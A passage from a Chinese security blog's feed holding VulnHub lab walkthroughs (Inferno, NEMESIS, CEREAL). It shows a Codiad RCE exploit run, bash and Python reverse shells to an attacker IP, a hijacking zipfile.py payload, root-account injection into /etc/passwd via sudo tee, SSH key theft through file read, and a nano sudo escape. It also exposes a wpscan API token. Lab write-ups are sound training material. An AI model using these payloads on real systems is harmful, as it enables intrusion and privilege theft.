data-src=\"/N1h1l157/VULNHUB/image-1073.png\" width=\"660\" alt=\"Image\">\n<p>右键可以上传文件，可以上传一个 php 文件看看什么效果</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1074.png\" width=\"660\" alt=\"Image\">\n<p>上传 shell.php 文件用来反弹 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1075.png\" width=\"660\" alt=\"Image\">\n<p>找了大半天根本找不到 shell.php 上传的位置，只能放弃这个方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1076.png\" width=\"400\" alt=\"Image\">\n<p>但是仔细观察的话，发现这个网站的 header 的部分，有一个 codiad，这是一个框架，可以去搜索这个框架自身有没有漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1077.png\" width=\"480\" alt=\"Image\">\n<h3 id=\"codiad-rce漏洞\"><a class=\"markdownIt-Anchor\" href=\"#codiad-rce漏洞\">#</a> codiad RCE 漏洞</h3>\n<p>本地直接用 searchsploit 搜寻 codiad 发现了是存在 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1078.png\" width=\"520\" alt=\"Image\">\n<p>-x 确定 exp 的位置，将 exp 复制到自己的目录下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1079.png\" width=\"470\" alt=\"Image\">\n<p>直接用 py 运行此程序，看一下使用说明</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1080.png\" width=\"620\" alt=\"Image\">\n<p>依据使用说明，构造好命令<br>\n <code>python exploit.py http://admin:dante1@192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux</code> <br>\n <code>echo 'bash -c &quot;bash -i &gt;/dev/tcp/192.168.31.135/4445 0&gt;&amp;1 2&gt;&amp;1&quot;' | nc -lnvp 4444</code> <br>\n <code>nc -lnvp 4444</code></p>\n<p>在 http: 后面加了 admin:dante1@是为了突破第一层的认证，因为进入该网站需要两次认证，认证了第一次之后才会进入到 codiad 页面，否则显示未授权</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1081.png\" width=\"660\" alt=\"Image\">\n<p>显示是失败的，不知道什么原因，但是在实际测试中，经常会碰到这样的情况，这时就需要在去寻找新的 payload 进行利用</p>\n<p>找到了一个 RCE 漏洞的脚本: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dhbmdZaWhhbmcvQ29kaWFkLVJlbW90ZS1Db2RlLUV4ZWN1dGUtRXhwbG9pdA==\">https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1082.png\" width=\"660\" alt=\"Image\">\n<p><code>python exploit.py http://192.168.31.25/inferno/ admin dante1 192.168.31.83 4444 linux</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1083.png\" width=\"660\" alt=\"Image\">\n<p>没有加第一层认证回显了未授权  <code>python exploit.py http://admin:dante1@192.168.31.25/inferno/) admin dante1 192.168.31.83 4444 linux</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1084.png\" width=\"660\" alt=\"Image\">\n<p>在 4445 端口处接收到了反弹的 shell, 拿到了网站的 webshell, 依据下面三个命令输出为一个标准的 shell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1085.png\" width=\"660\" alt=\"Image\">\n<h3 id=\"十六进制换算\"><a class=\"markdownIt-Anchor\" href=\"#十六进制换算\">#</a> 十六进制换算</h3>\n<p>看了 /etc/passwd 发现我们需要先拿到 dante 用户的权限再去拿 root 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1086.png\" width=\"620\" alt=\"Image\">\n<p>搜寻目录，在 dante 的 Downloads 文件下找到了一个.download.daty 隐藏文件，打开之后看到是一串 16 进制的数据，需要解密</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1087.png\" width=\"660\" alt=\"Image\">\n<p>在 CyberChef 上进行解密，from Hex 得到了 dante 用户的密码 V1rg1l10h3lpm3</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1088.png\" width=\"620\" alt=\"Image\">\n<p>在密码的最后有个小数点，并不知道这个小数点是否参与了密码，但是试两次就知道结果了 V1rg1l10h3lpm3. 或者 V1rg1l10h3lpm3</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1089.png\" width=\"520\" alt=\"Image\">\n<p>凭借第二个密码拿到了 dante 用户的 shell</p>\n<h3 id=\"term-设置\"><a class=\"markdownIt-Anchor\" href=\"#term-设置\">#</a> TERM 设置</h3>\n<p>输入 clear 时显示 TERM 变量没有设置，我们只需要通过 export 命令将 TERM 改为 xterm 即可解决这个终端美化问题</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1090.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"tee权限错误写passwd\"><a class=\"markdownIt-Anchor\" href=\"#tee权限错误写passwd\">#</a> tee 权限错误写 passwd</h3>\n<p>sudo -l 看到直接调用 tee 命令写入文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1091.png\" width=\"520\" alt=\"Image\">\n<p>在 gtfobins 上看到了使用 tee 提权的代码如下，先设置一个本地的文件，将自己的一些数据追加到本地的文件里边，基于此，构造一个 SHA512 的密码，直接往 /etc/passwd 里边添加一个 root 账户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1092.png\" width=\"620\" alt=\"Image\">\n<p>利用 kali 机器生成一个 SHA512 的值，密码为 123456  <code>mkpasswd --method=SHA-512 --stdin</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1093.png\" width=\"700\" alt=\"Image\">\n<p>在靶机上依次执行下列命令，报错先不管</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入新的享有root功能的用户<span class=\"built_in\">test</span> 2 并验证是否写入成功</span></span><br><span class=\"line\">LFILE=/etc/passwd</span><br><span class=\"line\">echo &#x27;test2:$6$/VIJFJppMzTLzIjH$fnPPrC8J2dR8Fei748mY5MNaETVedvIoFgAXA8c33GThHZ2Cy7cflwv9Eo5xZJGWLHir1J.jh3VnnaBMkP74/0:0:0:root:/root:/bin/bash&#x27; | sudo tee -a &quot;$LFILE&quot;</span><br><span class=\"line\">cat /etc/passwd | grep /bin/bash</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">依据新建的用户进入其shell</span></span><br><span class=\"line\">su test2 123456</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1094.png\" width=\"700\" alt=\"Image\">\n<p>-&gt; 结果显示我们当前已经拿到了 root 账户</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/",
            "title": "VULNHUB 46 NEMESIS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==\">https://www.vulnhub.com/entry/ia-nemesis-101,582/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv\">https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 NEMESIS：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1399.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1400.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.0.184 靶机开放端口 80</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1402.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 52845 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"目录扫描\"><a class=\"markdownIt-Anchor\" href=\"#目录扫描\">#</a> 目录扫描</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODQv\">http://192.168.0.184/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1403.png\" width=\"620\" alt=\"Image\">\n<p>到处看了看，发现有一个用户名和密码</p>\n<p><code>Login Details =&gt; username : hacker_in_the_town password : thanos</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1404.png\" width=\"620\" alt=\"Image\">\n<p>找到登陆界面，用这个账户密码尝试登陆</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1405.png\" width=\"620\" alt=\"Image\">\n<p>登陆成功，但是进入到登陆后的界面，查询之后没有任何发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1406.png\" width=\"620\" alt=\"Image\">\n<p>用字典爆破目录，收集目录信息信息</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.0.184/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1407.png\" width=\"660\" alt=\"Image\">\n<p>依次访问几个目录发现没有比较明显的漏洞，换个字典，在爆破一波目录</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1408.png\" width=\"660\" alt=\"Image\">\n<p>爆出来的目录里边都没有什么发现，看一下下一个端口网站</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv\">http://192.168.0.184:52845/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1410.png\" width=\"620\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.184:52845</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1411.png\" width=\"660\" alt=\"Image\">\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.184:52845/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1412.png\" width=\"700\" alt=\"Image\">\n<p>目录都没有什么问题，看来只能对页面的功能点尝试了</p>\n<h3 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h3>\n<p>在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1414.png\" width=\"520\" alt=\"Image\">\n<p>点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了有 shell 的三个用户分别为 root，carlos，thanos</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1415.png\" width=\"580\" alt=\"Image\">\n<p>既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机</p>\n<p>依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1416.png\" width=\"520\" alt=\"Image\">\n<p>root 下的没有读取到，可能是做了权限设置或者不存在私钥文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1417.png\" width=\"520\" alt=\"Image\">\n<p>thanos 下的读取到了，审查源代码处复制私钥到本地</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1418.png\" width=\"620\" alt=\"Image\">\n<p>最后把 carlos 下的私钥文件看看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1419.png\" width=\"520\" alt=\"Image\">\n<p>这个用户下的私钥文件也没有读取到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1420.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"特权用户计划任务\"><a class=\"markdownIt-Anchor\" href=\"#特权用户计划任务\">#</a> 特权用户计划任务</h3>\n<p>根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限<br>\n <code>chmod 600 thanos_id_rsa</code> <br>\n <code>ssh thanos@192.168.31.47 -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1421.png\" width=\"620\" alt=\"Image\">\n<p>在靶机上看到了一个备份文件内容如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1422.png\" width=\"470\" alt=\"Image\">\n<p>上传 pspy 监控，看这个备份脚本有没有定期被执行<br>\n <code>wget 192.168.0.168/pspy64s -q ;chmod +x pspy64s;./pspy64s</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1423.png\" width=\"520\" alt=\"Image\">\n<p>看到这个 UID=1000 的用户定期执行了 backup.py 这个脚本，而在前面收集到的 /etc/passwd 文件可知，UID=1000 的用户是 carlos</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1424.png\" width=\"620\" alt=\"Image\">\n<blockquote>\n<p>分析这个备份文件，可知它引入了 zipfile 这个包，而它会优先在同一目录下寻找 zipfile，当脚本将被执行时，它不会使用 zipfile 模块，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS16aXBmaWxlLTJkNWsyY3NyaDlzcXQ5YXpmbWg1YnI0Znp0dzZwOWR4MzlhdWQyZC5weQ==\">而是会导入我们的恶意软件 zipfile.py</span>，并且我们的反向 shell 也会被执行。</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可在本地尝试此命令是否能反弹shell：</span></span><br><span class=\"line\">cat &gt; zipfile.py &lt;&lt; EOF</span><br><span class=\"line\">ZIP_DEFLATED = 0</span><br><span class=\"line\">class ZipFile:</span><br><span class=\"line\">\tdef close(*args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\tdef write(*args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\tdef __init__(self, *args):</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">__import__(&#x27;os&#x27;).system(&#x27;bash -c &quot;bash -i&gt;&amp; /dev/tcp/192.168.0.168/4444 0&gt;&amp;1&quot;&#x27;)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1425.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"py反弹shell优化\"><a class=\"markdownIt-Anchor\" href=\"#py反弹shell优化\">#</a> py 反弹 shell 优化</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以不用借助bash直接用python来反弹shell，本地测试能否用在上靶机</span></span><br><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.168&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上面的这个脚本不会反弹处标准shell，下面的这个会反弹处标准终端</span></span><br><span class=\"line\">python -c &#x27;import socket,pty,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.168&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&quot;HISTFILE&quot;,&quot;/dev/null&quot;);pty.spawn(&quot;/bin/bash&quot;);s.close()&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"仿射加密法解密\"><a class=\"markdownIt-Anchor\" href=\"#仿射加密法解密\">#</a> 仿射加密法解密</h3>\n<blockquote>\n<p>现在成功拿到了 carlos 用户，即 UID= 1000 用户的终端，看到一个加密脚本仿射加密法与单码加密法没什么不同，因为明文的每个字母分别只映射到一个密文字母。仿射密码的加密算法就是一个线性变换，即对任意的明文字符 x，对应的密文字符为 y=e (x)=ax+b (mod26)，其中，a,b∈Z 26 ，且要求 gcd (a, 26 )= 1 , 函数 e (x) 称为仿射加密函数。</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1426.png\" width=\"480\" alt=\"Image\">\n<p>并且在此目录下找到了一个文件提示说密码为</p>\n<p>The password format is “****<strong><strong><strong><strong>FUN</strong></strong></strong></strong>”</p>\n<blockquote>\n<p>此脚本的作用就是将原密码加密后变成了 FAJSRWOXLAXDQZAWNDDVLSU 要两个 key 值，知道 FUN 经过加密后变成了 QZA，依此推断 key 的范围。关于更多放射密码可访问 https://en.wikipedia.org/wiki/Affine_cipher</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 1.py &lt;&lt; EOF</span><br><span class=\"line\">import sys</span><br><span class=\"line\">\tdef affine_encrypt(text, key):</span><br><span class=\"line\">\treturn &#x27;&#x27;.join([ chr((( key[0]*(ord(t) - ord(&#x27;A&#x27;)) + key[1] ) % 26) + ord(&#x27;A&#x27;)) for t in text.upper().replace(&#x27; &#x27;, &#x27;&#x27;) ])</span><br><span class=\"line\">\t</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">\taffine_text=&quot;FUN&quot;</span><br><span class=\"line\">\tfor key0 in range(65, 91):</span><br><span class=\"line\">\t\tfor key1 in range(65, 91):</span><br><span class=\"line\">\t\t\tencrypt_text = affine_encrypt(affine_text, [key0, key1])</span><br><span class=\"line\">\t\t\tif encrypt_text == &quot;QZA&quot;:</span><br><span class=\"line\">\t\t\t\tprint(key0,key1)</span><br><span class=\"line\">\t\t\t\tsys.exit(0)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1427.png\" width=\"500\" alt=\"Image\">\n<p>得到 key 为（ 89 ， 65 ）之后，编写解密文件，进行解密密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; 2.py &lt;&lt; EOF</span><br><span class=\"line\">def affine_decrypt(cipher):</span><br><span class=\"line\">\ttext = []</span><br><span class=\"line\">\tfor t in cipher:</span><br><span class=\"line\">\t\tb = ord(t) - ord(&#x27;A&#x27;)</span><br><span class=\"line\">\t\tfor x in range(0, 26):</span><br><span class=\"line\">\t\t\tresult = (65 + x*89 - b) % 26</span><br><span class=\"line\">\t\t\tif result == 0:</span><br><span class=\"line\">\t\t\t\ttext.append(chr(x + ord(&#x27;A&#x27;)))</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\">\tprint(&#x27;&#x27;.join(text))</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">\taffine_encrypted_text = &quot;FAJSRWOXLAXDQZAWNDDVLSU&quot;</span><br><span class=\"line\">\taffine_decrypt(affine_encrypted_text)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1428.png\" width=\"390\" alt=\"Image\">\n<p>得到的密码测试之后是属于 carlos 用户的密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1429.png\" width=\"240\" alt=\"Image\">\n<h3 id=\"sudonano提权\"><a class=\"markdownIt-Anchor\" href=\"#sudonano提权\">#</a> sudo (nano) 提权</h3>\n<p>有了密码之后可以看到 carlos 用户权限设置</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1430.png\" width=\"580\" alt=\"Image\">\n<p>nano 的权限设置错误了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看gtfobins找到了提权命令</span></span><br><span class=\"line\">sudo /bin/nano /opt/priv</span><br><span class=\"line\">Ctrl + R</span><br><span class=\"line\">Ctrl + X</span><br><span class=\"line\">reset; sh 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1431.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/",
            "title": "VULNHUB 44 CEREAL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==\">https://www.vulnhub.com/entry/cereal-1,703/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15779414.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 CEREAL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1305.png\" width=\"520\" alt=\"Image\">\n<p>2 ）粗略的识别一下该 ip 上开放了哪些端口<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1306.png\" width=\"660\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31. 83<br>\n 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555</p>\n<p>3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1307.png\" width=\"500\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示<br>\n 21 ftp：可尝试进行匿名登陆下载文件<br>\n 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 、44441 http：可对 web 进行渗透测试收集信息<br>\n 3306 mysql：可进行自制字典爆破或社工收集账户密码<br>\n 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。<br>\n445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，能通过该端口共享硬盘。</p>\n</blockquote>\n<blockquote>\n<p>注意到有很多服务名字是 tcpwrapped：<br>\n这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</p>\n</blockquote>\n<h3 id=\"ftp-匿名访问\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名访问\">#</a> FTP 匿名访问</h3>\n<p>打开 <span class=\"exturl\" data-url=\"ZnRwOi8vMTkyLjE2OC4zMS44Mw==\">ftp://192.168.31.83</span> 进行 ftp 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1308.png\" width=\"420\" alt=\"Image\">\n<p>有一个空文件夹 pub、没有更多的详细信息暴露出来</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMv\">http://192.168.31.83/</span> 进行 web 信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1309.png\" width=\"530\" alt=\"Image\">\n<blockquote>\n<p>对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。</p>\n</blockquote>\n<p>接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.83/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1310.png\" width=\"660\" alt=\"Image\">\n<p>依次对识别到的目录进行访问：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=\">http://192.168.31.83/blog/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1311.png\" width=\"520\" alt=\"Image\">\n<p>找到了两条信息，域名 <span class=\"exturl\" data-url=\"aHR0cDovL2NlcmVhbC5jdGY=\">http://cereal.ctf</span> , 另一个看网站的形式像是 wordpress.</p>\n<p>修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1312.png\" width=\"470\" alt=\"Image\">\n<p>再次打开网站，看一下页面有啥变化</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1313.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"wpscan-枚举\"><a class=\"markdownIt-Anchor\" href=\"#wpscan-枚举\">#</a> wpscan 枚举</h3>\n<p>用 wpscan 进行一波扫描，枚举用户名<br>\n <code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://cereal.ctf/blog/ --enumerate u</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1314.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 得到两个用户名分别为 cereal 和 Cereal</p>\n<p>一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试</p>\n<p><code>wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U 'cereal,Cereal' -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://cereal.ctf/blog/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1315.png\" width=\"700\" alt=\"Image\">\n<p>果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域名</p>\n<p>尝试搜索子域名后无果，继续访问我们收集到的其他 web</p>\n<p><span class=\"exturl\" 